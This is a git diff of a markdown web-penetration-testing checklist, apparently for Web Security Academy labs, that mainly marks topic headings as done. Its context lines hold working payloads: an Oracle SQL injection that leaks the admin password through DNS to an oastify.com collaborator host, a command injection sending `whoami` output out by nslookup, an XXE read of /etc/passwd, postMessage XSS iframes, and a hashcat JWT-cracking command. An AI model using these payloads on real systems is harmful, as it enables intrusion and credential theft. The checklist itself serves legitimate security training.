@@ -80,12 +80,12 @@ Check if interesting data can be found.
 - Email change
 
 ## Step 3 - Identify vulnrabilities
-### SQL injections
+### :white_check_mark: SQL injections
 #### DNS exfiltration
 Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`
 
-### NoSQL injections
-### Authentication
+### :white_check_mark: NoSQL injections
+### :white_check_mark: Authentication
 ### :white_check_mark: Path traversal
 #### Step 1 - Built-in scanner
 - Use the built-in scanner : right-click the filename (e.g. https://example.com/?filename=text.jpg) and scan the selected insertion point.
@@ -99,17 +99,17 @@ Send the upload request to _Intruder_, then
 3. Run the attack in _Sniper mode_
 4. Check the responses status code and/or length to identify filtered extensions.
 
-### Command injection
+### :white_check_mark: Command injection
 _Burp suite extension : Active scan++ | Collaborator everywhere_
 The main command injection objective is to extract data. Multiple ways to achieve this :
 - Results reflected on the website
 - Results written in non accessible files in the server (leverage with SSRF maybe)
 - Results extracted with DNS request e.g. `test%40test.fr%7cnslookup%20-q%3dcname%20%60whoami%60.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.%26` i.e. ``test@test.fr|nslookup -q=cname `whoami`.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.&``
 
-### Business logic vulnerabilities
-### Information disclosure
-### Access control
-### File upload
+### :white_check_mark: Business logic vulnerabilities
+### :white_check_mark: Information disclosure
+### :white_check_mark: Access control
+### :white_check_mark: File upload
 _Burp suite extension : Upload Scanner_
 
 <ins>Important</ins> : when identifying vulnerabilities with this extension, it may not reveal the real request is the _issue_ pane. To get the real request sent, copy paste the filename that was sent (usually a randomly generated filename), and search for it in Logger.
@@ -151,9 +151,9 @@ Manual scan is needed because the extension can't test some cases :
 ![Burp showing PHP RCE via EXIF](https://github.com/Molx32/websec/blob/main/img/fileuploadexif.png)
 - SSRF with filename (check with collaborator everywhere?)
 
-### Race conditions
-### Server-side request forge (SSRF)
-### Path traversal
+### :white_check_mark: Race conditions
+### :white_check_mark: Server-side request forge (SSRF)
+### :white_check_mark: Path traversal
 #### LFI fuzzing
 For fuzzing lists, use:
 - Burp Pro default
@@ -163,14 +163,14 @@ GET /image?filename=<INTRUDER_INPUT>
 Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 ```
 
-### XXE Injection
+### :white_check_mark: XXE Injection
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
-### Cross-site scripting (XSS)
-### Cross-site request forge (CSRF)
+### :white_check_mark: Cross-site scripting (XSS)
+### :white_check_mark: Cross-site request forge (CSRF)
 #### CSRF using Javascript fetch()
 ```
 <html>
@@ -219,16 +219,16 @@ xhr.send();
   </script>
 </html>
 ```
-### Cross-origin resource sharing (CORS)
-### Clickjacking
-### DOM-based vulnerabilities
+### :white_check_mark: Cross-origin resource sharing (CORS)
+### :white_check_mark: Clickjacking
+### :white_check_mark: DOM-based vulnerabilities
 #### Web messages
 ```
 <iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 <iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}','*')">
 ```
-### WebSockets
-### Insecure deserialization
+### :white_check_mark: WebSockets
+### :white_check_mark: Insecure deserialization
 #### Java
 ##### Install JDK 8
 1. Download from [Oracle website](https://www.oracle.com/fr/java/technologies/javase/javase8-archive-downloads.html)
@@ -241,8 +241,8 @@ xhr.send();
 Leverage [Python wrapper](https://github.com/Molx32/websec/blob/main/deserialization/ysoserial.py) to get all payloads in a file, then use Intruder and wait for collaborator to retrieve DNS calls.
 
 #### Others
-### GraphQL API vulnerabilities
-### Server-side template injection
+### :white_check_mark: GraphQL API vulnerabilities
+### :white_check_mark: Server-side template injection
 _Burp suite extensions : None_
 _Third party tool : [SSTImap](https://github.com/vladko312/SSTImap)_
 
@@ -279,14 +279,14 @@ Check all the results to see if the injection was sucessful. If it is, modify it
 
 #### ⚠️TODO : find a payload list for all kind of template
 
-### Web cache poisoning
-### HTTP Host header attacks
+### :white_check_mark: Web cache poisoning
+### :white_check_mark: HTTP Host header attacks
 #### Automated scan
 1. Run Param Miner extension with all scans
 2. Run `can selected insertion point` on the host header
 #### Check reflection in response headers
 
-### HTTP request smuggling
+### :white_check_mark: HTTP request smuggling
 _Burp suite extensions : Param miner | HTTP Request Smuggler_
 #### Step 1 - Scan
 - Use the **Param Miner** (all options)
@@ -295,8 +295,8 @@ _Burp suite extensions : Param miner | HTTP Request Smuggler_
 
 #### Step 2 - Exploit
 
-### OAuth authentication
-### JWT attacks    
+### :white_check_mark: OAuth authentication
+### :white_check_mark: JWT attacks    
 _Burp suite extensions : JWT Editor_
 #### Unverified signature
 This attack only requires to change the current username (or other values) in the token. Just modify the JWT content without modifying anything else.
@@ -333,7 +333,7 @@ hashcat -a 0 -m 16500 <jwt> <wordlist>
 
 
 ## Various
-### Work with hash
+### :white_check_mark: Work with hash
 #### Identify hash
 Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
 #### Crack hash
